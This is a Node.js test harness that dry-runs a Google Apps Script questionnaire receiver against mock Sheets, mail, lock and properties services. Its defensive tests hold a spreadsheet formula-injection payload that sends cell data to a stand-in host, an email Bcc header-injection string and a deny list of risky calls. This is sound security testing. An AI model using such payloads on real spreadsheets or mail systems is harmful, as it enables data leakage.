#!/usr/bin/env node
/**
 * Dry run of receive_answers.gs against a stand-in for the Google services it uses.
 *
 *   node check_receiver.js receive_answers.gs twireless.questionnaire.json [--body message.json]
 *
 * The stand-in has only the methods the script is meant to use, so a typo or a missing method fails here instead of
 * on the first real answer. It checks what the script writes to the Sheet and sends by email, that bad and hostile
 * messages are turned away, that one failing service doesn't lose the answers, and that the limits hold.
 * --body is a message as the web page really posts it (check_app.py captures one); it must be accepted too.
 *
 * It can't check Google itself: that the permission screen, the deployment and the redirect behave as described.
 */
'use strict';
const fs = require('fs');
const vm = require('vm');

const args = process.argv.slice(2);
let bodyPath = null;
const flag = args.indexOf('--body');
if (flag >= 0) bodyPath = args.splice(flag, 2)[1];
const [scriptPath, dataPath] = args;
if (!scriptPath || !dataPath || (flag >= 0 && !bodyPath)) {
  console.error('usage: node check_receiver.js <receive_answers.gs> <data.json> [--body message.json]');
  process.exit(2);
}
const spec = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
const code = fs.readFileSync(scriptPath, 'utf8');
const OWNER = 'owner@example.test';

let passed = 0;
const failures = [];
function check(name, ok, detail) {
  if (ok) passed++;
  else failures.push(name + (detail === undefined ? '' : ' [' + (typeof detail === 'string' ? detail : JSON.stringify(detail)).slice(0, 200) + ']'));
}

// ---------------------------------------------------------------------------------------------
// the stand-in

function strict(name, obj, world) {
  return new Proxy(obj, {
    get(target, key) {
      if (key in target) return target[key];
      if (typeof key === 'symbol' || key === 'then' || key === 'toJSON') return undefined;
      world.standIn.push(name + '.' + String(key) + ' is not in the stand-in');
      throw new Error(name + '.' + String(key) + ' is not a method the stand-in has');
    },
  });
}

function formatDate(date, zone, pattern) {
  const parts = Object.fromEntries(new Intl.DateTimeFormat('en-CA', {
    timeZone: zone, hourCycle: 'h23', year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short',
  }).formatToParts(date).map((p) => [p.type, p.value]));
  const bad = pattern.replace(/yyyy|MM|dd|HH|mm|ss|z/g, '').match(/[A-Za-z]/);
  if (bad) throw new Error('date pattern letter ' + bad[0] + ' is not supported by the stand-in');
  return pattern.replace(/yyyy|MM|dd|HH|mm|ss|z/g, (t) => ({
    yyyy: parts.year, MM: parts.month, dd: parts.day, HH: parts.hour, mm: parts.minute, ss: parts.second, z: parts.timeZoneName,
  }[t]));
}

function makeWorld(opts = {}) {
  const w = {
    books: [], mails: [], props: {}, logs: [], errors: [], standIn: [], now: new Date('2026-10-28T15:04:05Z'),
    lock: { held: false, tries: 0, releases: 0 }, opts,
  };
  const keep = (name, obj) => strict(name, obj, w);

  function makeRange(sheet, r, c, nr, nc) {
    for (const n of [r, c, nr, nc]) if (!Number.isInteger(n) || n < 1) throw new Error('bad range arguments');
    const range = keep('Range', {
      setNumberFormat(f) {
        if (typeof f !== 'string') throw new Error('number format must be text');
        for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) sheet.formats.set((r + i) + ',' + (c + j), f);
        sheet.log.push('format ' + f);
        return range;
      },
      setValues(values) {
        if (!Array.isArray(values) || values.length !== nr || values.some((v) => !Array.isArray(v) || v.length !== nc)) {
          throw new Error('setValues needs a ' + nr + ' by ' + nc + ' array');
        }
        values.forEach((line, i) => line.forEach((v, j) => {
          if (!['string', 'number', 'boolean'].includes(typeof v)) throw new Error('a cell must be text, a number or true/false');
          const key = (r + i) + ',' + (c + j);
          const asText = sheet.formats.get(key) === '@';
          sheet.cells.set(key, { value: v, text: asText, formula: !asText && typeof v === 'string' && v.startsWith('=') });
          while (sheet.rows.length < r + i) sheet.rows.push([]);
          sheet.rows[r + i - 1][c + j - 1] = v;
        }));
        sheet.log.push('values');
        return range;
      },
      setFontWeight(x) { if (x !== 'bold' && x !== 'normal') throw new Error('bad weight'); sheet.bold.add(r); return range; },
    });
    return range;
  }

  function makeSheet(book) {
    const sh = { name: 'Sheet1', rows: [], cells: new Map(), formats: new Map(), bold: new Set(), frozen: 0, widths: {}, log: [] };
    sh.api = keep('Sheet', {
      setName(n) { if (typeof n !== 'string' || !n) throw new Error('bad name'); sh.name = n; return sh.api; },
      getName() { return sh.name; },
      getLastRow() { return sh.rows.length; },
      getRange(r, c, nr, nc) {
        if (opts.rowsThrow && r > 1) throw new Error('the Sheet would not take the row');
        return makeRange(sh, r, c, nr === undefined ? 1 : nr, nc === undefined ? 1 : nc);
      },
      setFrozenRows(n) { sh.frozen = n; },
      setColumnWidth(c, px) { sh.widths[c] = px; },
    });
    return sh;
  }

  function makeBook(name) {
    const b = { id: 'BOOK' + (w.books.length + 1), name, sheets: [] };
    b.sheets.push(makeSheet(b));
    b.api = keep('Spreadsheet', {
      getId() { return b.id; },
      getUrl() { return 'https://docs.google.com/spreadsheets/d/' + b.id + '/edit'; },
      getSheets() { return b.sheets.map((s) => s.api); },
      getSheetByName(n) { const s = b.sheets.find((x) => x.name === n); return s ? s.api : null; },
    });
    w.books.push(b);
    return b;
  }

  const sandbox = {
    console: { log: (m) => w.logs.push(String(m)), error: (m) => w.errors.push(String(m)) },
    Date: class extends Date {
      constructor(...a) { if (a.length) super(...a); else super(w.now.getTime()); }
      static now() { return w.now.getTime(); }
    },
    ContentService: keep('ContentService', {
      MimeType: { JSON: 'JSON', TEXT: 'TEXT' },
      createTextOutput(text) {
        if (typeof text !== 'string') throw new Error('output must be text');
        const out = { text, mime: null };
        out.api = keep('TextOutput', { setMimeType(m) { out.mime = m; return out.api; }, getContent() { return out.text; }, _mime: () => out.mime });
        return out.api;
      },
    }),
    LockService: keep('LockService', {
      getScriptLock() {
        return keep('Lock', {
          tryLock(ms) {
            if (typeof ms !== 'number' || ms <= 0) throw new Error('tryLock needs a wait in milliseconds');
            w.lock.tries++;
            if (opts.lockBusy) return false;
            if (w.lock.held) throw new Error('lock taken twice');
            w.lock.held = true;
            return true;
          },
          releaseLock() { if (!w.lock.held) throw new Error('released a lock that was not held'); w.lock.held = false; w.lock.releases++; },
        });
      },
    }),
    PropertiesService: keep('PropertiesService', {
      getScriptProperties() {
        return keep('Properties', {
          getProperty(k) { if (opts.propsThrow) throw new Error('properties are down'); return k in w.props ? w.props[k] : null; },
          setProperty(k, v) {
            if (opts.propsThrow) throw new Error('properties are down');
            if (typeof k !== 'string' || typeof v !== 'string') throw new Error('properties hold text only');
            w.props[k] = v;
          },
        });
      },
    }),
    SpreadsheetApp: keep('SpreadsheetApp', {
      create(name) {
        if (opts.sheetsThrow) throw new Error('Spreadsheets are down');
        if (typeof name !== 'string' || !name) throw new Error('a Sheet needs a name');
        return makeBook(name).api;
      },
      openById(id) {
        if (opts.sheetsThrow) throw new Error('Spreadsheets are down');
        const b = w.books.find((x) => x.id === id && !x.gone);
        if (!b) throw new Error('No spreadsheet with the ID ' + id);
        return b.api;
      },
    }),
    MailApp: keep('MailApp', {
      sendEmail(message) {
        if (opts.mailThrows) throw new Error('Service invoked too many times for one day: email.');
        if (!message || typeof message !== 'object') throw new Error('sendEmail needs an object here');
        const extra = Object.keys(message).filter((k) => !['to', 'subject', 'body', 'name'].includes(k));
        if (extra.length) throw new Error('sendEmail: the stand-in does not know ' + extra.join(', '));
        if (typeof message.to !== 'string' || !/^[^@\s,;]+@[^@\s,;]+\.[a-z]+$/i.test(message.to)) throw new Error('bad recipient: ' + message.to);
        if (typeof message.subject !== 'string' || /[\r\n]/.test(message.subject)) throw new Error('bad subject');
        if (typeof message.body !== 'string') throw new Error('the body must be text');
        if (w.mails.length >= 100) throw new Error('Service invoked too many times for one day: email.');
        w.mails.push(message);
      },
    }),
    Session: keep('Session', {
      getEffectiveUser() { return keep('User', { getEmail() { return opts.noEmail ? '' : OWNER; } }); },
      getScriptTimeZone() { return 'America/Toronto'; },
    }),
    Utilities: keep('Utilities', { formatDate }),
  };
  w.sandbox = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(code, sandbox, { filename: scriptPath });
  return w;
}

// ---------------------------------------------------------------------------------------------
// helpers

const post = (w, body) => {
  const contents = typeof body === 'string' ? body : JSON.stringify(body);
  return w.sandbox.doPost({ postData: { contents, type: 'text/plain', length: contents.length } });
};
const answer = (out) => JSON.parse(out.getContent());
const global = (w, name) => vm.runInContext(name, w.sandbox);
const rowsOf = (w) => (w.books[0] ? w.books[0].sheets[0].rows : []);

function message(extra = {}) {
  const answers = { postal: 'L6X 0G3', phone: 'Yes, for calls and texts', brands: ['iPhone (Apple)', 'Samsung Galaxy'] };
  return Object.assign({
    form: spec.client.slug, version: 1, sent_at: '2026-10-28T15:04:05.123Z', complete: false, answers,
    text: spec.form.app.answers_title + '\nAnswers as of: Oct 28, 2026\nQuestions answered: 3 of 13.\n\nWhich postal code is right?\n  L6X 0G3\n',
  }, extra);
}

function untouched(w, label) {
  check(label + ': nothing was written', w.books.length === 0 || rowsOf(w).length <= 1, rowsOf(w).length);
  check(label + ': nothing was emailed', w.mails.length === 0, w.mails.length);
}

function settled(w, label) {
  check(label + ': the lock is let go', !w.lock.held);
  check(label + ': the stand-in was never asked for something it lacks', w.standIn.length === 0, w.standIn);
}

// ---------------------------------------------------------------------------------------------
// checks

let loaded = null;
try {
  loaded = makeWorld();
  check('the script loads', true);
} catch (e) {
  check('the script loads', false, e && e.stack ? e.stack.split('\n').slice(0, 3).join(' | ') : String(e));
}

if (loaded) {
  // static: what the file says about itself
  check('it names the same form as the data file', global(loaded, 'FORM') === spec.client.slug, global(loaded, 'FORM'));
  check('it names the same client as the data file', global(loaded, 'NAME') === spec.client.name, global(loaded, 'NAME'));
  check('it has doGet, doPost and setup', ['doGet', 'doPost', 'setup'].every((f) => global(loaded, 'typeof ' + f) === 'function'));
  check('no email address is written in it', !/[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+\.[A-Za-z]{2,}/.test(code), code.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+\.[A-Za-z]{2,}/));
  check('the recipient is left to the owner of the script', global(loaded, 'NOTIFY_EMAIL') === '');
  const stripped = code.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const unwanted = ['UrlFetchApp', 'GmailApp', 'DriveApp', 'HtmlService', 'eval(', 'new Function', 'importScripts', 'setTrigger', 'ScriptApp'];
  check('it uses no service outside the Sheet, email, lock and properties', unwanted.every((n) => !stripped.includes(n)), unwanted.filter((n) => stripped.includes(n)));
  check('the home-made limits are sane', global(loaded, 'MAX_CELL') <= 50000 && global(loaded, 'MAX_BODY') >= 100000 && global(loaded, 'MAX_EMAILS_PER_DAY') <= 100);

  // the address opened in a browser
  {
    const w = makeWorld();
    const out = w.sandbox.doGet();
    const body = answer(out);
    check('opening the address says it is ready', body.ok === true && body.ready === true);
    check('and says it as JSON, with nothing else', out._mime() === 'JSON' && Object.keys(body).sort().join() === 'ok,ready', body);
    check('and touches nothing', w.books.length === 0 && w.mails.length === 0);
    settled(w, 'doGet');
  }

  // a good message
  {
    const w = makeWorld();
    const msg = message({ complete: true });
    const out = post(w, msg);
    const reply = answer(out);
    check('a good message is accepted', reply.ok === true, reply);
    check('the reply is JSON', out._mime() === 'JSON');
    check('one Sheet was made, called after the client', w.books.length === 1 && w.books[0].name.startsWith(spec.client.name), w.books.map((b) => b.name));
    const sh = w.books[0] && w.books[0].sheets[0];
    check('the sheet is called Answers and has a bold, frozen header', sh && sh.name === 'Answers' && sh.bold.has(1) && sh.frozen === 1, sh && [sh.name, [...sh.bold], sh.frozen]);
    check('the header names six columns', sh && sh.rows[0] && sh.rows[0].length === 6 && sh.rows[0][4] === 'Answers', sh && sh.rows[0]);
    const row = sh && sh.rows[1];
    check('the answers are in the second row', Boolean(row) && sh.rows.length === 2, sh && sh.rows.length);
    if (row) {
      check('with the time it arrived', /^2026-10-28 11:04:05 E[DS]T$/.test(row[0]), row[0]);
      check('the time the page sent it', row[1] === msg.sent_at, row[1]);
      check('whether every part was finished', row[2] === 'yes', row[2]);
      check('how many questions were answered', row[3] === '3', row[3]);
      check('the readable text, whole', row[4] === msg.text, row[4]);
      check('and the answers as data', JSON.stringify(JSON.parse(row[5])) === JSON.stringify(msg.answers), row[5]);
      check('every cell of the row is plain text', [1, 2, 3, 4, 5, 6].every((c) => sh.cells.get('2,' + c).text === true));
    }
    check('the cells were made plain text before the values went in', sh && sh.log.indexOf('format @') >= 0 && sh.log.indexOf('format @') < sh.log.lastIndexOf('values'), sh && sh.log);
    check('one email was sent', w.mails.length === 1, w.mails.length);
    const mail = w.mails[0] || {};
    check('to the owner of the script', mail.to === OWNER, mail.to);
    check('with a subject that says how much came in', mail.subject === spec.client.name + ' questionnaire: 3 answers, all parts finished', mail.subject);
    check('and the answers as readable text', typeof mail.body === 'string' && mail.body.includes(msg.text.trim()));
    check('and a link to the Sheet', typeof mail.body === 'string' && mail.body.includes(w.books[0].api.getUrl()));
    check('from a sender named for the questionnaire', typeof mail.name === 'string' && mail.name.startsWith(spec.client.name));
    check('the Sheet is remembered', w.props.SHEET_ID === w.books[0].id);
    settled(w, 'a good message');

    // a second one goes below the first, in the same Sheet
    const again = answer(post(w, message({ complete: false, answers: { postal: 'L6X 5K7' } })));
    check('a second message is accepted', again.ok === true);
    check('into the same Sheet', w.books.length === 1);
    check('on the next row', rowsOf(w).length === 3 && rowsOf(w)[2][2] === 'no' && rowsOf(w)[2][3] === '1', rowsOf(w).length);
    check('with its own email, saying one answer', w.mails.length === 2 && /: 1 answer, not all parts finished$/.test(w.mails[1].subject), w.mails[1] && w.mails[1].subject);
    settled(w, 'two messages');

    // the owner deleted the Sheet for good: a new one takes over
    w.books[0].gone = true;
    const third = answer(post(w, message()));
    check('if the Sheet has been deleted, a new one is made and used', third.ok === true && w.books.length === 2 && w.props.SHEET_ID === w.books[1].id && w.books[1].sheets[0].rows.length === 2);
    settled(w, 'a deleted Sheet');
  }

  // a message the way the page really posts it
  if (bodyPath) {
    const w = makeWorld();
    const raw = fs.readFileSync(bodyPath, 'utf8');
    const real = JSON.parse(raw);
    const reply = answer(post(w, raw));
    check('a message made by the real page is accepted', reply.ok === true, reply);
    const row = rowsOf(w)[1];
    check('its text and answers land in the row unchanged', Boolean(row) && row[4] === real.text && JSON.stringify(JSON.parse(row[5])) === JSON.stringify(real.answers));
    check('its question count is the number of answers', Boolean(row) && row[3] === String(Object.keys(real.answers).length), row && row[3]);
    check('and none of it was cut', Boolean(row) && !row[4].includes('[cut'), real.text.length);
    check('the email carries the whole text', w.mails.length === 1 && w.mails[0].body.includes(real.text.trim()));
    check('a message from the page is far below the size limit', raw.length < global(w, 'MAX_BODY') / 2, raw.length);
    settled(w, 'the real message');
  }

  // things that are not answers
  const nots = {
    'text that is not JSON': 'hello',
    'an empty body': '',
    'a JSON list': '[1,2,3]',
    'JSON null': 'null',
    'a number': '7',
    'another form': message({ form: 'somebody-else' }),
    'no form': (() => { const m = message(); delete m.form; return m; })(),
    'no text': (() => { const m = message(); delete m.text; return m; })(),
    'text that is only spaces': message({ text: ' \n\t ' }),
    'text that is not text': message({ text: { a: 1 } }),
    'no answers': (() => { const m = message(); delete m.answers; return m; })(),
    'answers as a list': message({ answers: ['a'] }),
    'answers as text': message({ answers: 'a' }),
    'answers as null': message({ answers: null }),
    'a valid message over the size limit': JSON.stringify(message({ text: 'z'.repeat(200000) })),
  };
  for (const [what, body] of Object.entries(nots)) {
    const w = makeWorld();
    const out = post(w, body);
    const reply = answer(out);
    check('turned away: ' + what, reply.ok === false, reply);
    check('and it is still JSON: ' + what, out._mime() === 'JSON');
    untouched(w, what);
    settled(w, what);
  }
  for (const [what, e] of [['no request at all', undefined], ['a request without a body', {}], ['a body that is not text', { postData: { contents: 5 } }]]) {
    const w = makeWorld();
    let reply = null;
    try { reply = answer(w.sandbox.doPost(e)); } catch (err) { reply = { threw: String(err) }; }
    check('turned away without an error: ' + what, reply && reply.ok === false, reply);
    untouched(w, what);
    settled(w, what);
  }

  // hostile or clumsy content that is shaped like an answer
  {
    const w = makeWorld();
    const nasty = ['=HYPERLINK("https://example.test/?"&A1,"x")', '+1 (647) 555-0100', '-2+3', '@SUM(1,1)', '\t=1+1', '\r=1+1'];
    for (const text of nasty) post(w, message({ text, answers: { postal: text } }));
    const sh = w.books[0].sheets[0];
    check('every hostile message was kept', sh.rows.length === 1 + nasty.length, sh.rows.length);
    check('none of it is stored as a formula', [...sh.cells.values()].every((c) => !c.formula));
    check('nothing in the Sheet starts like a formula', sh.rows.slice(1).every((r) => r.every((c) => !/^[=+\-@\t\r]/.test(c))), sh.rows.slice(1).map((r) => r[4]));
    check('the text is otherwise as sent', sh.rows[1][4] === ' ' + nasty[0]);
    check('emails of it are plain text with a clean subject', w.mails.length === nasty.length && w.mails.every((m) => !/[\r\n]/.test(m.subject) && m.htmlBody === undefined));
    settled(w, 'hostile content');
  }
  {
    const w = makeWorld();
    post(w, message({ sent_at: 'x'.repeat(500) + '\nBcc: someone@example.test', complete: 'yes', answers: { a: 1, b: 2 } }));
    const row = rowsOf(w)[1];
    check('a long or odd "sent" time is cut', row && row[1].length <= 40, row && row[1].length);
    check('only the real "true" counts as finished', row && row[2] === 'no', row && row[2]);
    check('the subject is built from our own words only', w.mails[0] && w.mails[0].subject === spec.client.name + ' questionnaire: 2 answers, not all parts finished', w.mails[0] && w.mails[0].subject);
    settled(w, 'odd fields');
  }
  {
    const w = makeWorld();
    const big = 'y'.repeat(150000);
    const reply = answer(post(w, message({ text: big, answers: { a: big.slice(0, 40000) } })));
    check('a very long message is still accepted', reply.ok === true, reply);
    const row = rowsOf(w)[1];
    check('but each cell is cut to fit', row && row[4].length <= global(w, 'MAX_CELL') && row[5].length <= global(w, 'MAX_CELL'), row && [row[4].length, row[5].length]);
    check('and says it was cut', row && row[4].includes('[cut'));
    check('the email is cut the same way', w.mails[0] && w.mails[0].body.length < 50000);
    settled(w, 'a long message');
  }

  // one service failing must not lose the answers
  {
    const w = makeWorld({ mailThrows: true });
    const reply = answer(post(w, message()));
    check('if the email fails the row is still kept and the page is told ok', reply.ok === true && rowsOf(w).length === 2, reply);
    check('and the failure is logged', w.errors.some((e) => /email/.test(e)), w.errors);
    settled(w, 'email down');
  }
  {
    const w = makeWorld({ sheetsThrow: true });
    const reply = answer(post(w, message()));
    check('if the Sheet fails the email still goes and the page is told ok', reply.ok === true && w.mails.length === 1, reply);
    check('without a link to a Sheet that is not there', w.mails[0] && !/docs\.google\.com/.test(w.mails[0].body), w.mails[0] && w.mails[0].body);
    check('and the failure is logged', w.errors.some((e) => /row/.test(e)), w.errors);
    settled(w, 'Sheets down');
  }
  {
    const w = makeWorld({ sheetsThrow: true, mailThrows: true });
    let reply = null;
    try { reply = answer(post(w, message())); } catch (err) { reply = { threw: String(err) }; }
    check('if both fail the page is told so, without an exception', reply && reply.ok === false && !reply.threw, reply);
    settled(w, 'both down');
  }
  {
    const w = makeWorld({ rowsThrow: true, mailThrows: true });
    let reply = null;
    try { reply = answer(post(w, message())); } catch (err) { reply = { threw: String(err) }; }
    check('if the Sheet is there but neither the row nor the email works, the page is told so', reply && reply.ok === false && !reply.threw, reply);
    settled(w, 'row and email down');
  }
  {
    const w = makeWorld({ propsThrow: true });
    let reply = null;
    try { reply = answer(post(w, message())); } catch (err) { reply = { threw: String(err) }; }
    check('a broken service never escapes as an exception', reply && !reply.threw && typeof reply.ok === 'boolean', reply);
    settled(w, 'properties down');
  }
  {
    const w = makeWorld({ lockBusy: true });
    const reply = answer(post(w, message()));
    check('if the lock can not be had the page is told to try again', reply.ok === false && reply.error === 'busy', reply);
    untouched(w, 'a busy lock');
    check('and no lock is released that was never held', w.lock.releases === 0);
    settled(w, 'a busy lock');
  }
  {
    const w = makeWorld({ noEmail: true });
    const reply = answer(post(w, message()));
    check('with no address to email, the row is kept and the page is told ok', reply.ok === true && rowsOf(w).length === 2 && w.mails.length === 0, reply);
    settled(w, 'no address');
  }

  // limits and the recipient
  {
    const w = makeWorld();
    const cap = global(w, 'MAX_EMAILS_PER_DAY');
    let allOk = true;
    for (let i = 0; i < cap + 5; i++) allOk = answer(post(w, message({ answers: { n: String(i) } }))).ok && allOk;
    check('past the daily limit every message is still accepted', allOk);
    check('and still gets a row', rowsOf(w).length === 1 + cap + 5, rowsOf(w).length);
    check('but only the limit of emails goes out', w.mails.length === cap, w.mails.length);
    w.now = new Date(w.now.getTime() + 24 * 3600 * 1000);
    post(w, message());
    check('the next day emails start again', w.mails.length === cap + 1, w.mails.length);
    settled(w, 'the daily limit');
  }
  {
    const w = makeWorld();
    vm.runInContext("NOTIFY_EMAIL = 'someone.else@example.test'", w.sandbox);
    post(w, message());
    check('NOTIFY_EMAIL sends the email somewhere else', w.mails.length === 1 && w.mails[0].to === 'someone.else@example.test', w.mails[0] && w.mails[0].to);
    settled(w, 'another recipient');
  }

  // setup(), run once from the editor
  {
    const w = makeWorld();
    w.sandbox.setup();
    check('setup makes the Sheet', w.books.length === 1 && w.props.SHEET_ID === w.books[0].id);
    check('writes a row that says it is a test', rowsOf(w).length === 2 && /^TEST/.test(rowsOf(w)[1][4]) && rowsOf(w)[1][3] === '0', rowsOf(w));
    check('sends one email that says it is a test', w.mails.length === 1 && /^TEST: /.test(w.mails[0].subject) && w.mails[0].to === OWNER, w.mails[0] && w.mails[0].subject);
    check('and logs where the Sheet is and where emails go', w.logs.some((l) => /docs\.google\.com/.test(l)) && w.logs.some((l) => l.includes(OWNER)), w.logs);
    w.sandbox.setup();
    check('running it again does not make a second Sheet', w.books.length === 1, w.books.length);
    settled(w, 'setup');
  }
  {
    const w = makeWorld({ sheetsThrow: true, mailThrows: true });
    let threw = false;
    try { w.sandbox.setup(); } catch (err) { threw = true; }
    check('setup fails loudly when nothing works, so the editor shows it', threw);
  }
  {
    const w = makeWorld({ rowsThrow: true, mailThrows: true });
    let threw = false;
    try { w.sandbox.setup(); } catch (err) { threw = true; }
    check('setup fails loudly when the Sheet is made but neither the row nor the email works', threw);
  }
  {
    const w = makeWorld({ mailThrows: true });
    let threw = false;
    try { w.sandbox.setup(); } catch (err) { threw = true; }
    check('setup does not fail when only the email does (the row was kept)', !threw);
  }
}

if (failures.length) {
  console.error('RECEIVER DRY RUN FAILED (' + failures.length + ' of ' + (passed + failures.length) + ' checks)');
  failures.slice(0, 30).forEach((f) => console.error('  - ' + f));
  process.exit(3);
}
console.log('receiver dry run ok: ' + passed + ' checks' + (bodyPath ? ', including a message made by the real page' : ''));
